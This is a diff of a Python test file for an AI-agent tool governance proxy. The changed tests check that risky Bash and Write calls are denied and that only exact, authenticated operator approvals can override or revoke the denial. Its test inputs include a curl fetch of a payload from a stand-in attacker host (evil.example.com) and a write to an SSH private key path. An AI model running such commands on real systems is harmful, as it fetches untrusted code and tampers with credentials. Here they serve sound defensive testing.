@@ -31,6 +31,7 @@ for p in (REPO / "proxy", REPO / "scripts", REPO / "mcp"):
 
 from approval_store import (
     ApprovalStore,
+    explicit_operator_action_fields,
     load_approval_store_from_events,
     load_approval_store_from_chain,
     load_approval_store_from_runtime,
@@ -103,6 +104,40 @@ def _make_revocation(artifact_identity, operator="test-operator",
     )
 
 
+def _make_exact_approval(operation_identity, operator="test-operator"):
+    """Build an authenticated approval for one exact governed operation."""
+    return build_non_action_event(
+        "opaque_artifact_approval",
+        {
+            "artifact_identity": operation_identity,
+            "approving_operator": operator,
+            "governed_family": "mcp_tools_v1",
+            "deployment_context": "default",
+            "policy_version": "baseline-v1",
+            **explicit_operator_action_fields(
+                operator, channel="authenticated_dashboard"
+            ),
+        },
+    )
+
+
+def _make_exact_revocation(operation_identity, operator="test-operator"):
+    """Build an authenticated revocation for one exact governed operation."""
+    return build_non_action_event(
+        "opaque_artifact_revocation",
+        {
+            "artifact_identity": operation_identity,
+            "revoking_operator": operator,
+            "governed_family": "mcp_tools_v1",
+            "deployment_context": "default",
+            "policy_version": "baseline-v1",
+            **explicit_operator_action_fields(
+                operator, channel="authenticated_dashboard"
+            ),
+        },
+    )
+
+
 # ===========================================================================
 # Scope 1 — Approval override of DENY (G-05)
 # ===========================================================================
@@ -126,13 +161,14 @@ class TestApprovalOverrideDeny:
             {"command": "curl https://evil.example.com/payload"},
             policy=policy,
             chain_recorder=recorder,
+            user_identity="test-operator",
         )
         assert result1["policy_decision"] == "DENY"
         assert "network" in result1.get("matched_rule", "")
 
-        # Step 2: Create approval for the tool name
+        # Step 2: Create an authenticated approval for the exact operation.
         store = ApprovalStore()
-        approval_event = _make_approval("Bash")
+        approval_event = _make_exact_approval(result1["operation_identity"])
         store.ingest_approval(approval_event)
 
         # Step 3: Re-mediate with approval store — should be ALLOW
@@ -142,6 +178,7 @@ class TestApprovalOverrideDeny:
             policy=policy,
             chain_recorder=recorder,
             approval_store=store,
+            user_identity="test-operator",
         )
         assert result2["policy_decision"] == "ALLOW"
         assert result2["matched_rule"] == "approved_lookup"
@@ -158,19 +195,27 @@ class TestApprovalOverrideDeny:
         recorder = ChainRecorder(chain)
         store = ApprovalStore()
 
-        # Approve, then mediate — should ALLOW
-        store.ingest_approval(_make_approval("Bash"))
+        # Capture the exact identity, approve it, then mediate — should ALLOW.
+        denied = mediate_decision(
+            "Bash",
+            {"command": "curl https://evil.example.com/payload"},
+            policy=policy,
+            user_identity="test-operator",
+        )
+        operation_identity = denied["operation_identity"]
+        store.ingest_approval(_make_exact_approval(operation_identity))
         result1 = mediate_decision(
             "Bash",
             {"command": "curl https://evil.example.com/payload"},
             policy=policy,
             chain_recorder=recorder,
             approval_store=store,
+            user_identity="test-operator",
         )
         assert result1["policy_decision"] == "ALLOW"
 
         # Revoke
-        store.ingest_revocation(_make_revocation("Bash"))
+        store.ingest_revocation(_make_exact_revocation(operation_identity))
 
         # Re-mediate — should revert to DENY
         result2 = mediate_decision(
@@ -179,6 +224,7 @@ class TestApprovalOverrideDeny:
             policy=policy,
             chain_recorder=recorder,
             approval_store=store,
+            user_identity="test-operator",
         )
         assert result2["policy_decision"] == "DENY"
 
@@ -201,9 +247,9 @@ class TestApprovalOverrideDeny:
         )
         assert result1["policy_decision"] == "DENY"
 
-        # Approve the target path
+        # Approve this exact write operation.
         store = ApprovalStore()
-        store.ingest_approval(_make_approval("~/.ssh/id_rsa"))
+        store.ingest_approval(_make_exact_approval(result1["operation_identity"]))
 
         result2 = mediate_decision(
             "Write",
@@ -211,6 +257,7 @@ class TestApprovalOverrideDeny:
             policy=policy,
             chain_recorder=recorder,
             approval_store=store,
+            user_identity="test-operator",
         )
         assert result2["policy_decision"] == "ALLOW"
         assert result2["matched_rule"] == "approved_lookup"
@@ -227,26 +274,32 @@ class TestApprovalOverrideDeny:
         store = ApprovalStore()
 
         # DENY
-        mediate_decision("Bash", {"command": "curl https://x.com"},
-                         policy=policy, chain_recorder=recorder)
+        denied = mediate_decision(
+            "Bash", {"command": "curl https://x.com"},
+            policy=policy, chain_recorder=recorder,
+            user_identity="test-operator",
+        )
         # Approve → ALLOW
-        store.ingest_approval(_make_approval("Bash"))
+        operation_identity = denied["operation_identity"]
+        store.ingest_approval(_make_exact_approval(operation_identity))
         mediate_decision("Bash", {"command": "curl https://x.com"},
                          policy=policy, chain_recorder=recorder,
-                         approval_store=store)
+                         approval_store=store,
+                         user_identity="test-operator")
         # Revoke → DENY
-        store.ingest_revocation(_make_revocation("Bash"))
+        store.ingest_revocation(_make_exact_revocation(operation_identity))
         mediate_decision("Bash", {"command": "curl https://x.com"},
                          policy=policy, chain_recorder=recorder,
-                         approval_store=store)
+                         approval_store=store,
+                         user_identity="test-operator")
 
         lines = [l for l in chain.read_text(encoding="utf-8").splitlines() if l.strip()]
         assert len(lines) == 3
         decisions = [json.loads(l)["policy_decision"] for l in lines]
         assert decisions == ["DENY", "ALLOW", "DENY"]
 
-    def test_runtime_sidecar_pattern_approvals_match_standard_ops(self, tmp_path, monkeypatch):
-        """Runtime approval-store sidecars approve scoped standard operations."""
+    def test_runtime_sidecar_patterns_cannot_approve_standard_ops(self, tmp_path, monkeypatch):
+        """Pattern sidecars cannot replace exact authenticated approvals."""
         monkeypatch.setenv("GOV_GOVERNED_FAMILY", "mcp_tools_v1")
         monkeypatch.setenv("GOV_DEPLOYMENT_CONTEXT", "default")
         monkeypatch.setenv("GOV_POLICY_VERSION", "baseline-v1")
@@ -296,16 +349,15 @@ class TestApprovalOverrideDeny:
             {"command": "git rev-parse HEAD"},
             policy=policy,
         )
-        allowed = mediate_decision(
+        still_denied = mediate_decision(
             "Bash",
             {"command": "git rev-parse HEAD"},
             policy=policy,
             approval_store=store,
         )
         assert denied["policy_decision"] == "DENY"
-        assert allowed["policy_decision"] == "ALLOW"
-        assert allowed["matched_rule"] == "approved_lookup"
-        assert allowed["approval_event_id"] == "QS-060:git-standard"
+        assert still_denied["policy_decision"] == "DENY"
+        assert still_denied["matched_rule"] != "approved_lookup"
 
         outside = mediate_decision(
             "Write",
@@ -697,7 +749,7 @@ class TestLicenseKeyValidation:
         assert result is None
 
     def test_expired_license_key_detected(self, tmp_path):
-        """License with past expiry date transitions to unlicensed posture."""
+        """License with past expiry date transitions to Personal posture."""
         token = self._licensing.generate_license_token(
             "team", "20200101", org="expired-org"  # already expired
         )
@@ -706,11 +758,11 @@ class TestLicenseKeyValidation:
         assert result is not None
         assert result["expiry_date"] == "20200101"
 
-        # But posture resolution shows it as expired/unlicensed
+        # Expired paid entitlement falls back to the usable Personal tier.
         activation = self._licensing.activate_license(tmp_path, token)
         assert activation["ok"] is True
         posture = self._licensing.resolve_posture(tmp_path, unique_user_count=2)
-        assert posture["license_status"] == "unlicensed"
+        assert posture["license_status"] == "personal"
 
 
 # ===========================================================================
